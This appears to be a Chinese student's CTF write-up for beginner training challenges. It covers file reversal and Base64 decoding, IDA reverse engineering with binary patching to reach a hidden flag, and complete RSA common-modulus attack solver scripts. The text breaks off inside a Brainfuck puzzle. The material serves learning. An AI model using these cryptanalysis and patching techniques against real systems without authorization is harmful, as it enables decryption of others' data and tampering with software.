      <url>/2025/10/06/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>目录：</p><ul><li><a href="#%E9%B8%A3%E8%B0%A2">鸣谢</a></li><li><a href="#%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2">曼波曼波曼波</a></li><li><a href="#ida%E4%BD%BF%E7%94%A8exe">ida使用.exe</a></li><li><a href="#twoes1">twoEs1</a></li><li><a href="#twoes2">twoEs2</a></li><li><a href="#%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7">签个到吧！</a></li><li><a href="#xor">xor</a><ul><li><a href="#%E7%AC%AC%E4%B8%80%E6%AD%A5">第一步</a></li><li><a href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5">第二步</a></li><li><a href="#%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81">解密代码</a></li></ul></li><li><a href="#%E8%BF%99%E7%BE%BD%E6%AF%9B%E7%90%83%E6%80%8E%E4%B9%88%E5%8F%AA%E6%9C%89%E4%B8%80%E5%8D%8A%E5%95%8A%E6%81%BC">这羽毛球怎么只有一半啊（恼）</a><ul><li><a href="#%E5%BE%85">【待】</a></li></ul></li><li><a href="#%E6%8E%A9%E7%A0%81%E7%88%86%E7%A0%B4">掩码爆破</a></li><li><a href="#f12">F12?</a></li><li><a href="#f12-1">F12</a></li><li><a href="#test">test</a></li><li><a href="#word-03">word-03</a></li><li><a href="#basic-number-theory">Basic Number theory</a></li><li><a href="#basic-rsa">basic-RSA</a></li><li><a href="#hackbar">hackbar</a></li><li><a href="#super_baby_eval">super_baby_eval</a></li><li><a href="#baby_upload">baby_upload</a></li><li><a href="#baby_eval">baby_eval</a></li><li><a href="#super_baby_include">super_baby_include</a></li><li><a href="#robots">robots</a></li><li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li></ul><h3 id="鸣谢"><a class="header-anchor" href="#鸣谢">¶</a>鸣谢</h3><ul><li>感谢sq,xc学长和cty学姐的帮助和教导！！！</li><li>除了大头像放后面做其他也是完结了，第一次wp磕磕绊绊做出来了嘻嘻</li></ul><h3 id="曼波曼波曼波"><a class="header-anchor" href="#曼波曼波曼波">¶</a>曼波曼波曼波</h3><ul><li>倒转的base，翻转脚本：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读取 txt 文件并翻转内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_txt_file</span>(<span class="params">input_path, output_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        </span><br><span class="line">        reversed_content = content[::-<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(reversed_content)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功！原文件: <span class="subst">&#123;input_path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;反转文件: <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;原内容长度: <span class="subst">&#123;<span class="built_in">len</span>(content)&#125;</span> 字符&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;反转内容长度: <span class="subst">&#123;<span class="built_in">len</span>(reversed_content)&#125;</span> 字符&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：找不到文件 <span class="subst">&#123;input_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">r&#x27;E:\app-down\题目工作区\mbmb\smn.txt&#x27;</span></span><br><span class="line">output_file = <span class="string">r&#x27;E:\app-down\题目工作区\reversed_smn.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">reverse_txt_file(input_file, output_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>AI：Base64 编码的 ZIP 文件数据，解码后就恢复成原始的 ZIP 二进制文件。</li><li>使用 CyberChef（厨子）：<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a><ul><li>Input (Base64字符串)</li><li>Drag “From Base64” recipe</li><li>得到二进制数据</li><li>点击右下角下载按钮保存为 .zip 文件</li></ul></li><li>双图盲水印：<ul><li><a href="https://www.shuzhiduo.com/A/kjdwEn0wJN/">方法原地址</a></li><li>注意：在文件下打开poweshell</li><li>存档-电脑此工具位置：E:\app-down\双图盲水印\BlindWaterMark-master\BlindWaterMark-master</li></ul></li></ul><h3 id="ida使用-exe"><a class="header-anchor" href="#ida使用-exe">¶</a>ida使用.exe</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to Reverse Engineering!!!</span><br><span class="line">欢迎来到逆向工程！！！</span><br><span class="line"></span><br><span class="line">Press Enter to find flag1</span><br><span class="line">按 Enter 键查找 flag1</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;</span><br><span class="line">NSSCTF&#123;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next, I will teach you how to use ida.</span><br><span class="line">接下来，我将教你如何使用 IDA。</span><br><span class="line"></span><br><span class="line">The first step is to open the exe file with ida.</span><br><span class="line">第一步是用 IDA 打开 exe 文件。</span><br><span class="line"></span><br><span class="line">F5 can convert the current interface into pseudo C code</span><br><span class="line">F5 可以将当前界面转换为伪 C 代码</span><br><span class="line"></span><br><span class="line">The shortcut key shfit + F12 is to view strings. We can often find the entry point here.</span><br><span class="line">快捷键 Shift + F12 用于查看字符串。我们经常可以在这里找到入口点。</span><br><span class="line"></span><br><span class="line">You can see flag2 there</span><br><span class="line">你可以在那里看到 flag2</span><br></pre></td></tr></table></figure><ul><li>function页面找main文件，在“You can see flag2 there”处快捷键 Shift + F12 ，找到：IDA_1s_4_VeRy_Impo</li><li>双击后页面按X连接可以看到flag2<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_2-11.png" alt="alt text"></li><li>Tab 键进入伪C代码页面，双击函数可进入详细界面</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The tab key can switch between the assembly and disassembly interfaces, and sometimes disassembly can interfere with our analysis.</span><br><span class="line">Tab 键可以在汇编和反汇编界面之间切换，有时候反汇编会干扰我们的分析。</span><br></pre></td></tr></table></figure><ul><li>Tab 键进入汇编页面，观察call类型以及灰色翻译部分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_2-9.png" alt="alt text"></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In ida, shift+E can extract data in order of the size of the program</span><br><span class="line">在 IDA 中，Shift+E 可以按程序大小顺序提取数据</span><br><span class="line"></span><br><span class="line">The R key is to convert data into character form</span><br><span class="line">R 键是将数据转换为字符形式</span><br><span class="line"></span><br><span class="line">Try to find flag3</span><br><span class="line">尝试找到 flag3</span><br></pre></td></tr></table></figure><ul><li>看mov，英文猜测important所以是倒序</li><li>断店操作：Debugger-local windows debugger-运行（如果没有窗口window-reset desktop）</li><li>直接双击找shift+E R 导出为string，得到：rTant_t0ol_iN_<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_3-1.png" alt="alt text"></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The left side of ida is the function, and sometimes you can find important information from the function name.</span><br><span class="line">IDA 的左侧是函数列表，有时候你可以从函数名中找到重要信息。</span><br><span class="line"></span><br><span class="line">The patch method can achieve our goal by directly modifying the binary file</span><br><span class="line">打补丁的方法可以通过直接修改二进制文件来实现我们的目标</span><br><span class="line"></span><br><span class="line">FLAG4 NOT HRER</span><br><span class="line">FLAG4 不在这里</span><br></pre></td></tr></table></figure><ul><li>flag4(void)（？汇编文件，选取函数名称搞补丁<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_3-2.png" alt="alt text"></li><li>通过任选printf()右键Assemble，改call后为函数名称，enter修改<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_3-3.png" alt="alt text"></li><li>右键Patching-apply导出，运行新程序得到：rever5e_en8ine3ring}<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE_3-4.png" alt="alt text"></li><li>注：在 IDA 中从流程图视图切换回连续的文本/表格视图用空格键</li><li>最后答案：NSSCTF{IDA_1s_4_VeRy_ImporTant_t0ol_iN_rever5e_en8ine3ring}</li></ul><h3 id="twoEs1"><a class="header-anchor" href="#twoEs1">¶</a>twoEs1</h3><ul><li>题目：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&quot;SPCCTF&#123;********&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e1 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">e2 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#导入 gmpy2 库进行大数运算 </span></span><br><span class="line"><span class="comment">#gmpy2.gcdext(a,b)计算扩展欧几里得算法 返回 (g,s,t)，其中 g=gcd(a,b)，且 s*a + t*b = g</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 77653027019410283582708662091841984922043011758121679079881183020813164663803315218162399044305258074482737579924642303624296916990420038267507847806411365847770079739424288020008734096352715536212355610499244337263033620679172659903396470522388964976403280440005666750783772493205491694203801534799771603973</span></span><br><span class="line"><span class="string">e1 = 1550550838</span></span><br><span class="line"><span class="string">e2 = 4196113069</span></span><br><span class="line"><span class="string">c1 = 10879882027555312937608696756143487708492509877667613620249639748606727334006539946052668627697088875994270713711095280209616987454727654075073679556671706894288288425066016765935927179268631914629763649753266424293357163466575462028472324055698901991171526421270840161635556574472647431065514324250656887711</span></span><br><span class="line"><span class="string">c2 = 3011958986718808526365150648555525977083765700624932707761381505508399298854491454270664897732491521128964864382168158216240628717617068568110917894811504799962807736416471284350198523924590448858301736435406723758509936349838419125901147351088181623044341056413457153562300106346324761118425649126782967195</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>解决方案(基于gcd = 1以及n相同加密)</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">77653027019410283582708662091841984922043011758121679079881183020813164663803315218162399044305258074482737579924642303624296916990420038267507847806411365847770079739424288020008734096352715536212355610499244337263033620679172659903396470522388964976403280440005666750783772493205491694203801534799771603973</span></span><br><span class="line">e1 = <span class="number">1550550838</span></span><br><span class="line">e2 = <span class="number">4196113069</span></span><br><span class="line">c1 = <span class="number">10879882027555312937608696756143487708492509877667613620249639748606727334006539946052668627697088875994270713711095280209616987454727654075073679556671706894288288425066016765935927179268631914629763649753266424293357163466575462028472324055698901991171526421270840161635556574472647431065514324250656887711</span></span><br><span class="line">c2 = <span class="number">3011958986718808526365150648555525977083765700624932707761381505508399298854491454270664897732491521128964864382168158216240628717617068568110917894811504799962807736416471284350198523924590448858301736435406723758509936349838419125901147351088181623044341056413457153562300106346324761118425649126782967195</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否互质</span></span><br><span class="line">gcd, u, v = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;gcd(e1,e2) = <span class="subst">&#123;gcd&#125;</span>&quot;</span>)  <span class="comment"># 应该是 1</span></span><br><span class="line"><span class="comment"># u × e1 + v × e2 = gcd(e1, e2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> gcd == <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># 计算明文</span></span><br><span class="line">    <span class="keyword">if</span> u &lt; <span class="number">0</span>:</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">        u = -u</span><br><span class="line">    <span class="keyword">if</span> v &lt; <span class="number">0</span>:</span><br><span class="line">        c2 = gmpy2.invert(c2, n) </span><br><span class="line">        v = -v</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1, u, n) * <span class="built_in">pow</span>(c2, v, n)) % n</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><ul><li>共模攻击：[ pow(a, b, n) → n为模数 ]（详见RSA）<ul><li>攻击原理：<br>如果 gcd(e1, e2) = 1，可以通过扩展欧几里得算法找到 u, v 使得：<br>u × e1 + v × e2 = 1<br>c1^u × c2^v ≡ m^(u×e1) × m^(v×e2) ≡ m^(u×e1 + v×e2) ≡ m^1 ≡ m (mod n)</li><li>根本原因：RSA 的安全性依赖于大数分解困难性，但当使用相同模数加密相同消息时，攻击者可以利用代数关系绕过分解问题。</li></ul></li></ul><h3 id="twoEs2"><a class="header-anchor" href="#twoEs2">¶</a>twoEs2</h3><ul><li>题目：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&quot;SPCCTF&#123;********&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e1 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">e2 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 97600241525101615748091592571664660926639880623676630098513390980179339048294452878617774530804846547759693682625720452045482941031433063601264167464483345140203593650062234011147495096867025786848883396312986373098722431552517575960894385653813275110519118159478403718867113163144951756435064109978693850991</span></span><br><span class="line"><span class="string">e1 = 3739335288</span></span><br><span class="line"><span class="string">e2 = 3124897683</span></span><br><span class="line"><span class="string">c1 = 33002001040793361121205743705051566694083960204437803400110996553874970546459769940895274538944142911035661180721041433582055055901827086366079458238180515982882281159369335115689197909674012289803866694817803339799332165760217770985620911446230237865457225365735286754884597360255964535103536362788889343153</span></span><br><span class="line"><span class="string">c2 = 28612632923221914052449458260170537094022260373135401108346955487860713981145320349945832078855063911329616383875004373295934310132767249858424266864981319085969453037587482565982836138763906635775429377847559657878241052164215585546465219419202751784070881845017799754069244601020027997406547478196338470880</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>解法：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">97600241525101615748091592571664660926639880623676630098513390980179339048294452878617774530804846547759693682625720452045482941031433063601264167464483345140203593650062234011147495096867025786848883396312986373098722431552517575960894385653813275110519118159478403718867113163144951756435064109978693850991</span></span><br><span class="line">e1 = <span class="number">3739335288</span></span><br><span class="line">e2 = <span class="number">3124897683</span></span><br><span class="line">c1 = <span class="number">33002001040793361121205743705051566694083960204437803400110996553874970546459769940895274538944142911035661180721041433582055055901827086366079458238180515982882281159369335115689197909674012289803866694817803339799332165760217770985620911446230237865457225365735286754884597360255964535103536362788889343153</span></span><br><span class="line">c2 = <span class="number">28612632923221914052449458260170537094022260373135401108346955487860713981145320349945832078855063911329616383875004373295934310132767249858424266864981319085969453037587482565982836138763906635775429377847559657878241052164215585546465219419202751784070881845017799754069244601020027997406547478196338470880</span></span><br><span class="line"></span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;s = &#x27;</span>,s)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n)*<span class="built_in">pow</span>(c2, s2, n) % n  <span class="comment"># 最后别忘记再模上一个n，整体都在模n中</span></span><br><span class="line"><span class="comment">#flag = long_to_bytes(m).decode()</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(iroot(m, <span class="number">3</span>)[<span class="number">0</span>]))</span><br><span class="line"><span class="comment">#print(flag) </span></span><br></pre></td></tr></table></figure><ul><li><a href="https://saga131.github.io/2024/09/17/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/">参考</a>；<a href="https://www.cnblogs.com/SevensNight/p/18766177">未看</a></li></ul><h3 id="签个到吧！"><a class="header-anchor" href="#签个到吧！">¶</a>签个到吧！</h3><ul><li>题目：</li></ul><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">&gt;<span class="literal">+++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br></pre></td></tr></table></figure><ul><li>试图解释：<ul><li>快速笔记：“.”为指针位置</li><li>&gt;+<ins><ins><ins><ins><ins><ins><ins><ins>[&lt;</ins></ins></ins>&gt;-±±±]&lt;[-]&gt;</ins></ins></ins></ins></ins><ins>[&lt;</ins>+++++++&gt;-±±±]<ul><li>&gt;+17 ; [&lt;+6&gt;-1] ; ; &gt;+12 ; [&lt;+9&gt;-] ;</li><li>0 17. ; 17<em>6 = 102 0. ; 0. 0 ; 0 12. ; 9</em>12 = 108 0. ;</li><li>102 0. → 108 